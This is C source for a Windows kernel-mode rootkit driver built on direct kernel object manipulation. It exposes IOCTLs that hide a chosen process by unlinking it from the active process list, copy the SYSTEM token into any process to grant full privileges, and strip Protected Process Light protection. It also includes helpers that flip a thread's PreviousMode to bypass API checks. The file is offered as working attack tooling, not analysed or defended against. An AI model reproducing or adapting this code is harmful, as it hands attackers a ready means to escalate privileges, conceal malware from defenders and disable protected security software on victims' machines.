/*
 * DKOM - Direct Kernel Object Manipulation
 * Process hiding, token stealing, protection removal
 */

#include <ntddk.h>

// ============================================================================
// EPROCESS OFFSETS - Win10 22H2 (verify with WinDbg)
// ============================================================================

#define OFF_LINKS    0x448   // ActiveProcessLinks
#define OFF_NAME     0x5A8   // ImageFileName
#define OFF_PID      0x440   // UniqueProcessId
#define OFF_TOKEN    0x4B8   // Token
#define OFF_PROT     0x87A   // Protection

#define OFF_PREVMODE 0x232   // KTHREAD.PreviousMode

// ============================================================================
// GET EPROCESS
// ============================================================================

PEPROCESS get_proc(HANDLE pid)
{
    PEPROCESS p;
    if(NT_SUCCESS(PsLookupProcessByProcessId(pid, &p)))
        return p;
    return 0;
}

// ============================================================================
// PROCESS HIDE - Unlink from ActiveProcessLinks
// ============================================================================

void proc_hide(PEPROCESS p)
{
    PLIST_ENTRY lst = (PLIST_ENTRY)((ULONG_PTR)p + OFF_LINKS);

    PLIST_ENTRY prev = lst->Blink;
    PLIST_ENTRY next = lst->Flink;

    prev->Flink = next;
    next->Blink = prev;

    lst->Flink = lst;
    lst->Blink = lst;
}

void proc_unhide(PEPROCESS p, PLIST_ENTRY orig)
{
    PLIST_ENTRY lst = (PLIST_ENTRY)((ULONG_PTR)p + OFF_LINKS);
    PLIST_ENTRY next = orig->Flink;

    lst->Flink = next;
    lst->Blink = orig;
    orig->Flink = lst;
    next->Blink = lst;
}

// ============================================================================
// TOKEN STEAL - SYSTEM elevation
// ============================================================================

void token_steal(PEPROCESS dst, PEPROCESS src)
{
    PACCESS_TOKEN tok = *(PACCESS_TOKEN*)((ULONG_PTR)src + OFF_TOKEN);
    *(PACCESS_TOKEN*)((ULONG_PTR)dst + OFF_TOKEN) = tok;
}

NTSTATUS elevate(HANDLE pid)
{
    PEPROCESS target = get_proc(pid);
    PEPROCESS system = get_proc((HANDLE)4);

    if(!target || !system) {
        if(target) ObDereferenceObject(target);
        if(system) ObDereferenceObject(system);
        return 0xC0000225;  // STATUS_NOT_FOUND
    }

    token_steal(target, system);

    ObDereferenceObject(target);
    ObDereferenceObject(system);
    return 0;
}

// ============================================================================
// PROTECTION REMOVE - PPL bypass
// ============================================================================

#pragma pack(push,1)
typedef struct {
    UCHAR Type : 3;
    UCHAR Audit : 1;
    UCHAR Signer : 4;
} PS_PROT;
#pragma pack(pop)

void prot_remove(PEPROCESS p)
{
    PS_PROT* pr = (PS_PROT*)((ULONG_PTR)p + OFF_PROT);
    pr->Type = 0;
    pr->Signer = 0;
    pr->Audit = 0;
}

// ============================================================================
// PREVIOUSMODE - Bypass Nt API checks
// ============================================================================

void set_kmode(PETHREAD t)
{
    PUCHAR pm = (PUCHAR)((ULONG_PTR)t + OFF_PREVMODE);
    *pm = 0;  // KernelMode
}

void set_umode(PETHREAD t)
{
    PUCHAR pm = (PUCHAR)((ULONG_PTR)t + OFF_PREVMODE);
    *pm = 1;  // UserMode
}

// ============================================================================
// ENUMERATE PROCESSES
// ============================================================================

void enum_procs(void)
{
    PEPROCESS init = PsInitialSystemProcess;
    PEPROCESS cur = init;

    do {
        PCHAR name = (PCHAR)((ULONG_PTR)cur + OFF_NAME);
        HANDLE pid = *(PHANDLE)((ULONG_PTR)cur + OFF_PID);

        DbgPrint("%p %.15s\n", pid, name);

        PLIST_ENTRY lst = (PLIST_ENTRY)((ULONG_PTR)cur + OFF_LINKS);
        cur = (PEPROCESS)((ULONG_PTR)lst->Flink - OFF_LINKS);
    } while(cur != init);
}

// ============================================================================
// FIND OFFSET DYNAMICALLY
// ============================================================================

ULONG find_links_off(void)
{
    PEPROCESS p = PsGetCurrentProcess();
    HANDLE pid = PsGetCurrentProcessId();

    for(ULONG off = 0; off < 0x800; off += sizeof(PVOID)) {
        if(*(PHANDLE)((ULONG_PTR)p + off) == pid) {
            return off + sizeof(PVOID);  // Links follows PID
        }
    }
    return 0;
}

// ============================================================================
// IOCTL DISPATCH
// ============================================================================

#define IOCTL_HIDE     0x80002000
#define IOCTL_ELEVATE  0x80002004
#define IOCTL_UNPROT   0x80002008

NTSTATUS ioctl_dispatch(PDEVICE_OBJECT d, PIRP irp)
{
    UNREFERENCED_PARAMETER(d);

    PIO_STACK_LOCATION stk = IoGetCurrentIrpStackLocation(irp);
    ULONG code = stk->Parameters.DeviceIoControl.IoControlCode;
    PVOID buf = irp->AssociatedIrp.SystemBuffer;

    NTSTATUS st = 0;

    switch(code) {
        case IOCTL_HIDE: {
            HANDLE pid = *(HANDLE*)buf;
            PEPROCESS p = get_proc(pid);
            if(p) {
                proc_hide(p);
                ObDereferenceObject(p);
            } else {
                st = 0xC0000225;
            }
            break;
        }

        case IOCTL_ELEVATE: {
            HANDLE pid = *(HANDLE*)buf;
            st = elevate(pid);
            break;
        }

        case IOCTL_UNPROT: {
            HANDLE pid = *(HANDLE*)buf;
            PEPROCESS p = get_proc(pid);
            if(p) {
                prot_remove(p);
                ObDereferenceObject(p);
            } else {
                st = 0xC0000225;
            }
            break;
        }

        default:
            st = 0xC0000010;
            break;
    }

    irp->IoStatus.Status = st;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, 0);
    return st;
}

// ============================================================================
// DRIVER ENTRY
// ============================================================================

PDEVICE_OBJECT g_dev = 0;

void drv_unload(PDRIVER_OBJECT drv)
{
    UNREFERENCED_PARAMETER(drv);
    UNICODE_STRING sym;
    RtlInitUnicodeString(&sym, L"\\DosDevices\\DKOM");
    IoDeleteSymbolicLink(&sym);
    if(g_dev) IoDeleteDevice(g_dev);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
{
    UNREFERENCED_PARAMETER(reg);

    UNICODE_STRING dev, sym;
    RtlInitUnicodeString(&dev, L"\\Device\\DKOM");
    RtlInitUnicodeString(&sym, L"\\DosDevices\\DKOM");

    IoCreateDevice(drv, 0, &dev, 0x22, 0, 0, &g_dev);
    IoCreateSymbolicLink(&sym, &dev);

    drv->DriverUnload = drv_unload;
    drv->MajorFunction[0] = ioctl_dispatch;
    drv->MajorFunction[2] = ioctl_dispatch;
    drv->MajorFunction[14] = ioctl_dispatch;

    return 0;
}

// ============================================================================
// EOF
// ============================================================================
